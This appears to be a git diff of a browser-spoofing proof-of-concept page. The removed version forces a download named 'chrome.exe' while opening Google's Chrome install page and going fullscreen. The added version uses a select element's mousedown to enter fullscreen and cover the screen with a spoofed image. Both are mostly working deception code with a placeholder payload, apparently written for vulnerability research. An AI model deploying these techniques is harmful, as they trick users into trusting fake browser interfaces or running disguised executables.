@@ -1,54 +1,49 @@
+<style>
+    select {
+        all: initial;
 
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <title>Download & Fullscreen on Keypress</title>
-</head>
-<body>
-  <center><h2>POC by 0x403for!</h2></center>
-  <input type="text" id="triggerInput">
-  <script>
-    document.getElementById('triggerInput').addEventListener('click', function() {
-      
- setTimeout(function() {
-        openWin();
- }, 2000);
- window.open('https://www.google.com/intl/en_in/chrome/next-steps.html?statcb=0&installdataindex=empty&defaultbrowser=0', '_blank');
-      goFullScreen();
-    }, { once: false }); 
-    
-    function Puf(uri, name) {
-      const link = document.createElement("a");
-      link.href = uri;
-      link.download = name;
-      document.body.appendChild(link);
-      link.click();
-      document.body.removeChild(link);
-    }
-    function openWin() {
-      Puf(
-        "data://google.com/application/x-msdownload;base64,ZXN0dGVzdGVzdHRlc3Q=",
-        "chrome.exe"
-      );
-    }
-    function goFullScreen() {
-      const element = document.documentElement;
-      if (element.requestFullscreen) {
-        element.requestFullscreen();
-      } else if (element.mozRequestFullScreen) { 
-        element.mozRequestFullScreen();
-      } else if (element.webkitRequestFullscreen) { 
-        element.webkitRequestFullscreen();
-      } else if (element.msRequestFullscreen) { 
-        element.msRequestFullscreen();
-
-      }
 
     }
 
-  </script>  
+    #front {
+        display: block;
+        top: 50vh;
+        left: 50vw;
+        position: fixed;
 
-  
-</body>
-</html>
+    }
+
+    #spoofed {
+        display: none;
+        z-index: 1000;
+    }
+
+    * {
+        margin: 0;
+        overflow: hidden;
+
+    }
+</style>
+
+<div id="spoofed">
+    <img src="spoof.png" class="header" style="width: 100vw;height: 100vh;" />
+</div>
+<center id="front">
+    <select onmousedown="requestPermission()">
+        <option>Click to spoof</option>
+
+    </select>
+</center>
+
+
+
+
+<script>
+    function requestPermission() {
+        var front = document.getElementById("front");
+        var spoofed = document.getElementById("spoofed");
+        document.documentElement.requestFullscreen();
+        spoofed.style.display = 'block';
+        front.style.opacity = "0";
+    }
+</script>
